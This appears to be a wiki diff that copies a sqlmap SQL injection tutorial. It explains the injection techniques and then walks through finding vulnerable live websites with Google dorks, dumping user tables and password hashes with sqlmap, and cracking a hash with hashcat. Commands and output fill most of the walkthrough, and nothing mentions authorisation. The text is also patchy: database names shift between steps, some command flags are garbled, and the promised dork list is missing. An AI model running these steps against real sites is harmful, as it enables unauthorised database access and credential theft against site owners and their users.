@@ -1,0 +1,265 @@
+===== Techniques: =====
+
+sqlmap is able to detect and exploit five different SQL injection types:
+
+**__Boolean-based blind:__**
+
+sqlmap replaces or appends to the affected parameter in the HTTP request, a syntatically valid SQL statement string containing a SELECT sub-statement, or any other SQL statement whose the user want to retrieve the output.
+
+For each HTTP response, by making a comparison between the HTTP response headers/body with the original request, the tool inference the output of the injected statement character by character. Alternatively, the user can provide a string or regular expression to match on True pages.
+
+The bisection algorithm implemented in sqlmap to perform this technique is able to fetch each character of the output with a maximum of seven HTTP requests.
+
+Where the output is not within the clear-text plain charset, sqlmap will adapt the algorithm with bigger ranges to detect the output.
+
+**__Time-based blind:__**
+
+sqlmap replaces or appends to the affected parameter in the HTTP request, a syntatically valid SQL statement string containing a query which put on hold the back-end DBMS to return for a certain number of seconds.
+
+For each HTTP response, by making a comparison between the HTTP response time with the original request, the tool inference the output of the injected statement character by character. Like for boolean-based technique, the bisection algorithm is applied.
+
+**__Error-based:__**
+
+sqlmap replaces or appends to the affected parameter a database-specific error message provoking statement and parses the HTTP response headers and body in search of DBMS error messages containing the injected pre-defined chain of characters and the subquery statement output within.
+
+This technique works only when the web application has been configured to disclose back-end database management system error messages.
+
+**__UNION query-based:__**
+
+sqlmap appends to the affected parameter a syntactically valid SQL statement starting with an UNION ALL SELECT. This techique works when the web application page passes directly the output of the SELECT statement within a for loop, or similar, so that each line of the query output is printed on the page content.
+
+sqlmap is also able to exploitpartial (single entry) UNION query SQL injection vulnerabilities which occur when the output of the statement is not cycled in a for construct, whereas only the first entry of the query output is displayed.
+
+**__Stacked queries:__**
+
+also known as piggy backing: sqlmap tests if the web application supports stacked queries and then, in case it does support, it appends to the affected parameter in the HTTP request, a semi-colon (;) followed by the SQL statement to be executed.
+    
+This technique is useful to run SQL statements other than SELECT, like for instance, data definition or data manipulation statements, possibly leading to file system read and write access and operating system command execution depending on the underlying back-end database management system and the session user privileges.
+
+==== Find a Vulnerable Website: ====
+
+This is usually the toughest bit and takes longer than any other steps. Those who know how to use Google Dorks knows this already, but in case you don’t I have put together a number of strings that you can search in Google. Just copy paste any of the lines in Google and Google will show you a number of search results.
+
+**__Google dork:__**
+
+A Google dork is an employee who unknowingly exposes sensitive corporate information on the Internet. The word dork is slang for a slow-witted or in-ept person.
+
+Google dorks put corporate information at risk because they unwittingly create back doors that allow an attacker to enter a network without permission and/or gain access to unauthorized information. To locate sensitive information, attackers use advanced search strings called Google dork queries.
+
+Google Dorks strings to find Vulnerable SQLMAP SQL injectable website:
+
+== Step 1: Initial check to confirm if website is vulnerable to SQLMAP SQL Injection ==
+
+For every string show above, you will get huundreds of search results. How do you know which is really vulnerable to SQLMAP SQL Injection. There’s multiple ways and I am sure people would argue which one is best but to me the following is the simplest and most conclusive.
+
+Let’s say you searched using this string inurl:item_id= and one of the google search result shows a website like this:
+
+http://www.gbhackers.com/products_showitem_clemco.php?item_id=28434
+
+Just add a single quotation mark ‘ at the end of the URL. (Just to ensure, ” is a double quotation mark and ” ‘ ” is a single quotation mark).
+
+So now your URL will become like this:
+
+http://www.gbhackers.com/products_showitem_clemco.php?item_id=28434'
+
+If the page returns an SQL error, the page is vulnerable to SQLMAP SQL Injection. If it loads or redirect you to a different page, move on to the next site in your Google search results page.
+
+See example error below in the screenshot. I’ve obscured everything including URL and page design for obvious reasons.
+
+img sqli-1
+
+Examples of SQLi Errors from Different Databases and Languages
+
+Microsoft SQL Server
+
+Server Error in ‘/’ Application. Unclosed quotation mark before the character string ‘attack;’.
+
+Description: An unhanded exception occurred during the execution of the current web request. Please review the stack trace for more information about the error where it originated in the code.
+
+Exception Details: System.Data.SqlClient.SqlException: Unclosed quotation mark before the character string ‘attack;’.
+
+MySQL Errors
+
+Warning: mysql_fetch_array(): supplied argument is not a valid MySQL result resource in /var/www/myawesomestore.com/buystuff.php on line 12
+
+Error: You have an error in your SQL syntax: check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’’ at line 12
+<code>
+Oracle Errors
+
+java.sql.SQLException: ORA-00933: SQL command not properly ended at oracle.jdbc.dbaaccess.DBError.throwSqlException(DBError.java:180) at oracle.jdbc.ttc7.TTIoer.processError(TTIoer.java:208)
+
+Error: SQLExceptionjava.sql.SQLException: ORA-01756: quoted string not properly terminated
+PostgreSQL Errors
+
+Query failed: ERROR: unterminated quoted string at or near “‘’’”
+</code>
+
+== Step 2: List DBMS databases using SQLMAP SQL Injection: ==
+
+As you can see from the screenshot above, I’ve found a SQLMAP SQL Injection vulnerable website. Now I need to list all the databases in that Vulnerable database. (this is also called enumerating number of columns). As I am using SQLMAP, it will also tell me which one is vulnerable.
+
+Run the following command on your vulnerable website with.
+
+<code>sqlmap -u http://www.gbhackers.com/products_showitem_clemco.php?item_id=28434 --dbs</code>
+
+In here:
+sqlmap   =     Name of sqlmap binary file
+-u             =     Target URL (e.g. “http://www.gbhackers.com/products_showitem_gbhac.php?item_id=28434”)
+–dbs       =     Enumerate DBMS databases
+
+See screenshot below.
+
+img sqli-2
+
+This commands reveals quite a few interesting info:
+<code>
+web application technology: Apache
+back-end DBMS: MySQL 5.0
+[10:55:53] [INFO] retrieved: information_schema
+[10:55:56] [INFO] retrieved: gbhackers
+[10:55:56] [INFO] fetched data logged to text files under
+ '/usr/share/sqlmap/output/www.gbhackers.com'
+</code>
+
+So, we now have two database that we can look into. information_schema is a standard database for almost every MYSQL database. So our interest would be on clemcoindustries database.
+
+== Step 3: List tables of target database using SQLMAP SQL Injection: ==
+
+Now we need to know how many tables this clemcoindustries database got and what are their names. To find out that information, use the following command:
+
+<code> sqlmap -u http://www.gbhackers.com/cgi-bin/item.cgi?item_id=15 -D 
+clemcoindustries --tables
+
+this database got 8 tables.
+
+[10:56:20] [INFO] fetching tables for database: 'gbhackers'
+[10:56:22] [INFO] heuristics detected web page charset 'ISO-8859-2'
+[10:56:22] [INFO] the SQL query used returns 8 entries
+[10:56:25] [INFO] retrieved: item
+[10:56:27] [INFO] retrieved: link
+[10:56:30] [INFO] retrieved: other
+[10:56:32] [INFO] retrieved: picture
+[10:56:34] [INFO] retrieved: picture_tag
+[10:56:37] [INFO] retrieved: popular_picture
+[10:56:39] [INFO] retrieved: popular_tag
+[10:56:42] [INFO] retrieved: user_info
+</code>
+img sqli-3
+
+and of course we want to check whats inside user_info table using SQLMAP SQL Injection as that table probably contains username and passwords.
+
+== Step 4: List columns on target table of selected database using SQLMAP SQL Injection: ==
+
+Now we need to list all the columns on target table user_info of clemcoindustries database using SQLMAP SQL Injection. SQLMAP SQL Injection makes it really easy, run the following command:
+
+<code>sqlmap -u http://www.gbhackers.com/cgi-bin/item.cgi?item_id=15 -D gbhackers-T user_info --columns
+
+This returns 5 entries from target table user_info of clemcoindustries database.
+
+[10:57:16] [INFO] fetching columns for table 'user_info' in database 'gbhackers '
+[10:57:18] [INFO] heuristics detected web page charset 'ISO-8859-2'
+[10:57:18] [INFO] the SQL query used returns 5 entries
+[10:57:20] [INFO] retrieved: user_id
+[10:57:22] [INFO] retrieved: int(10) unsigned
+[10:57:25] [INFO] retrieved: user_login
+[10:57:27] [INFO] retrieved: varchar(45)
+[10:57:32] [INFO] retrieved: user_password
+[10:57:34] [INFO] retrieved: varchar(255)
+[10:57:37] [INFO] retrieved: unique_id
+[10:57:39] [INFO] retrieved: varchar(255)
+[10:57:41] [INFO] retrieved: record_status
+[10:57:43] [INFO] retrieved: tinyint(4)
+</code>
+
+This is exactly what we are looking for … target table user_login and user_password .
+
+img sqli-4
+
+== Step 5: List usernames from target columns of target table of selected database using SQLMAP SQL Injection: ==
+
+SQLMAP SQL Injection makes is Easy! Just run the following command again:
+
+<code>sqlmap -u http://www.gbhackers.com/cgi-bin/item.cgi?item_id=15 -D 
+gbhackers-T user_info -C user_login --dump
+
+Guess what, we now have the username from the database:
+
+[10:58:39] [INFO] retrieved: userX
+[10:58:40] [INFO] analyzing table dump for possible password hashes
+</code>
+
+img sqli-5
+
+Almost there, we now only need the password to for this user.. Next shows just that..
+
+== Step 6: Extract password from target columns of target table of selected database using SQLMAP SQL Injection: ==
+
+You’re probably getting used to on how to use SQLMAP SQL Injection tool. Use the following command to extract password for the user.
+
+<code>sqlmap -u http://www.gbhackers.com/cgi-bin/item.cgi?item_id=15 -D gbhackers-T
+user_info -C user_password --dump
+
+We have hashed password : 24iYBc17xK0e
+
+[10:59:15] [INFO] the SQL query used returns 1 entries
+[10:59:17] [INFO] retrieved: 24iYBc17xK0e.
+[10:59:18] [INFO] analyzing table dump for possible password hashes
+Database: sqldummywebsite
+Table: user_info
+[1 entry]
++---------------+
+| user_password |
++---------------+
+| 24iYBc17xK0e. |
++---------------+
+</code>
+
+img sqli-6
+
+But hang on, this password looks funny. This can’t be someone’s password.. Someone who leaves their website vulnerable like that just can’t have a password like that.
+
+That is exactly right. This is a hashed password. What that means, the password is encrypted and now we need to decrypt it.
+
+I have covered how to decrypt password extensively on this Cracking MD5, phpBB, MySQL and SHA1 passwords with Hashcat on Kali Linux post. If you’ve missed it, you’re missing out a lot.
+
+I will cover it in short here but you should really learn how to use hashcat.
+
+=== Step 7: Cracking password: ===
+
+So the hashed password is 24iYBc17xK0e. . How do you know what type of hash is that?
+
+== 1.Identify Hash type: ==
+
+Luckily, Kali Linux provides a nice tool and we can use that to identify which type of hash is this. In command line type in the following command and on prompt paste the hash value:
+
+<code>hash-identifier</code>
+
+sqli-7
+
+Excellent. So this is DES(Unix) hash.
+
+== 2.Crack HASH using cudahashcat: ==
+
+First of all I need to know which code to use for DES hashes. So let’s check that
+
+<code>cudahashcat --help | grep DES</code>
+
+img sqli-8
+
+
+So it’s either 1500 or 3100. But it was a MYSQL Database, so it must be 1500.
+
+I saved the hash value 24iYBc17xK0e. in DES.hash file. Following is the command I am running:
+
+<code>cudahashcat -m 1500 -a 0 /root/sql/DES.hash /root/sql/rockyou.txt</code>
+
+img sqli-9
+
+Interesting find: Usual Hashcat was unable to determine the code for DES hash. (not in it’s help menu). Howeverm both cudaHashcat and oclHashcat found and cracked the key.
+
+Anyhow, so here’s the cracked password: abc123  24iYBc17xK0e. :abc123
+
+we now even have the password for this user.
+
+==== References ====
+https://gbhackers.com/sqlmap-detecting-exploiting-sql-injection/
